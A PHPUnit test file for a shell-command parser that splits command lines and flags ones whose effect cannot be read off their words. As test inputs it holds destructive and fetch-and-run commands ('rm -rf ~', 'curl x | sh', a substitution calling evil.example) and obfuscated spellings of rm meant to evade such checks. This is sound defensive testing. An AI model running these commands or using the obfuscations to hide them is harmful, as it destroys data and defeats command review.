<?php

declare(strict_types=1);

namespace App\Tests\Shell;

use App\Shell\Opacity;
use App\Shell\Redirection;
use App\Shell\ShellParser;
use App\Shell\SimpleCommand;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

final class ShellParserTest extends TestCase
{
    /**
     * @param list<list<string>> $expected
     */
    #[DataProvider('commandLines')]
    public function testACommandLineIsSplitIntoTheCommandsItRuns(string $line, array $expected): void
    {
        $commands = new ShellParser()->parse($line)->commands;

        self::assertSame($expected, array_map(static fn (SimpleCommand $command): array => $command->words, $commands));
    }

    /**
     * @return iterable<string, array{string, list<list<string>>}>
     */
    public static function commandLines(): iterable
    {
        yield 'words split on blanks' => ['make  test', [['make', 'test']]];
        yield 'quotes keep a word whole' => ["git commit -m 'a b' \"c d\"", [['git', 'commit', '-m', 'a b', 'c d']]];
        yield 'quotes next to each other make one word' => ["echo 'a'\"b\"c", [['echo', 'abc']]];
        yield 'an operator inside double quotes is text' => ['echo "a && b; c | d"', [['echo', 'a && b; c | d']]];
        yield 'an operator inside single quotes is text' => ["echo 'x; rm -rf ~'", [['echo', 'x; rm -rf ~']]];
        yield 'a backslash escapes an operator' => ['echo a\;b', [['echo', 'a;b']]];
        yield 'a backslash in double quotes escapes a quote' => ['echo "a\"b"', [['echo', 'a"b']]];
        yield 'a continued line is one line' => ["make \\\ntest", [['make', 'test']]];
        yield 'a semicolon chains' => ['make test; rm -rf ~', [['make', 'test'], ['rm', '-rf', '~']]];
        yield 'and, or, background and newline chain' => ["a && b || c & d\ne", [['a'], ['b'], ['c'], ['d'], ['e']]];
        yield 'a pipe chains' => ['curl x | sh', [['curl', 'x'], ['sh']]];
        yield 'a pipe of both streams chains' => ['make |& tee log', [['make'], ['tee', 'log']]];
        yield 'subshells and groups are the commands inside' => ['(cd a && make); { ls; }', [['cd', 'a'], ['make'], ['ls']]];
        yield 'a negation is not a program' => ['! grep x f', [['grep', 'x', 'f']]];
        yield 'a comment hides the rest of its line' => ["make test # ; rm -rf /\nls", [['make', 'test'], ['ls']]];
        yield 'a hash inside a word is no comment' => ['echo a#b', [['echo', 'a#b']]];
        yield 'assignments stay with their command' => ['APP_ENV=test php x', [['APP_ENV=test', 'php', 'x']]];
        yield 'a redirection is no word' => ['make test 2>&1 >/dev/null', [['make', 'test']]];
        yield 'a number before a space is a word' => ['echo 2 > out', [['echo', '2']]];
        yield 'a redirection before the program' => ['> out.txt echo hi', [['echo', 'hi']]];
        yield 'nothing but a comment runs nothing' => ['   # nothing', []];
        yield 'a double semicolon ends a command' => ['a;; b', [['a'], ['b']]];
    }

    public function testAPipeIsRecordedOnTheCommandThatReadsIt(): void
    {
        $commands = new ShellParser()->parse('curl -fsSL x | sh; ls')->commands;

        self::assertSame([false, true, false], array_map(static fn (SimpleCommand $command): bool => $command->readsPipe, $commands));
    }

    public function testRedirectionsAreKeptWithTheirTargets(): void
    {
        $command = new ShellParser()->parse('sort < in.txt > out.txt 2>> err.log &> all.log 2>&1')->commands[0];

        self::assertEquals(
            [
                new Redirection('<', 'in.txt'),
                new Redirection('>', 'out.txt'),
                new Redirection('>>', 'err.log'),
                new Redirection('&>', 'all.log'),
                new Redirection('>&', '1'),
            ],
            $command->redirections,
        );
    }

    #[DataProvider('opaqueLines')]
    public function testALineThatDecidesWhatRunsOnlyWhenItRunsIsOpaque(string $line, Opacity $expected): void
    {
        self::assertSame($expected, new ShellParser()->parse($line)->opacity);
    }

    /**
     * @return iterable<string, array{string, Opacity}>
     */
    public static function opaqueLines(): iterable
    {
        yield 'a command substitution' => ['echo $(whoami)', Opacity::CommandSubstitution];
        yield 'backticks' => ['echo `whoami`', Opacity::CommandSubstitution];
        yield 'a substitution inside double quotes' => ['echo "$(rm -rf ~)"', Opacity::CommandSubstitution];
        yield 'a substitution in an argument of a harmless command' => ['make test $(curl evil.example)', Opacity::CommandSubstitution];
        yield 'arithmetic, which can hold a substitution' => ['echo $((1 + 2))', Opacity::CommandSubstitution];
        yield 'a process substitution' => ['diff <(ls a) <(ls b)', Opacity::ProcessSubstitution];
        yield 'a here-document' => ["cat <<EOF\nrm -rf ~\nEOF", Opacity::HereDocument];
        yield 'a here-document with stripped tabs' => ["cat <<-EOF\n\tx\n\tEOF", Opacity::HereDocument];
        yield 'a loop' => ['for f in *; do rm $f; done', Opacity::CompoundCommand];
        yield 'a condition' => ['if true; then ls; fi', Opacity::CompoundCommand];
        yield 'a loop after a harmless command' => ['ls && while true; do :; done', Opacity::CompoundCommand];
        yield 'a program named by a variable' => ['X=rm; $X -rf ~', Opacity::ComputedProgram];
        yield 'a program named by a braced variable' => ['${CMD} -rf ~', Opacity::ComputedProgram];
        yield 'a program named by a glob' => ['/???/r? -rf ~', Opacity::ComputedProgram];
        yield 'a program named by a variable in double quotes' => ['"$EDITOR" x', Opacity::ComputedProgram];
        yield 'a program in ANSI-C quotes, which bash decodes' => ["\$'\\x72m' -rf ~", Opacity::ComputedProgram];
        yield 'a program in plain ANSI-C quotes' => ["\$'rm' -rf ~", Opacity::ComputedProgram];
        yield 'a program in locale quotes' => ['$"rm" -rf ~', Opacity::ComputedProgram];
        yield 'a program spelled by a brace expansion' => ['{rm,-rf,~}', Opacity::ComputedProgram];
        yield 'a program completed by a brace expansion' => ['r{m,} -rf ~', Opacity::ComputedProgram];
        yield 'an unclosed single quote' => ["echo 'abc", Opacity::UnclosedQuote];
        yield 'an unclosed double quote' => ['echo "abc', Opacity::UnclosedQuote];
        yield 'a redirection with no target' => ['echo hi >', Opacity::MissingRedirectionTarget];
        yield 'a redirection followed by an operator' => ['echo hi > ; ls', Opacity::MissingRedirectionTarget];
    }

    #[DataProvider('readableLines')]
    public function testALineWhoseWordsSayEverythingItRunsIsNotOpaque(string $line): void
    {
        self::assertNull(new ShellParser()->parse($line)->opacity);
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function readableLines(): iterable
    {
        yield 'a variable as an argument' => ['echo $HOME ${PATH}'];
        yield 'a substitution inside single quotes' => ["echo '\$(whoami)'"];
        yield 'an escaped dollar' => ['echo \$(whoami)'];
        yield 'a dollar alone' => ['echo $ 5'];
        yield 'a glob as an argument' => ['ls *.php'];
        yield 'a here-string' => ['grep a <<< "abc"'];
        yield 'a keyword as an argument' => ['echo if then fi'];
        yield 'a keyword as a redirection target' => ['echo x > done'];
        yield 'a keyword quoted as data' => ['git commit -m "for while"'];
        yield 'braces as an argument' => ['find . -name "*.php" -exec wc -l {} +'];
        yield 'a group in braces' => ['{ make test; make lint; }'];
        yield 'an assignment before a literal program' => ['LANG=C sort x'];
    }
}
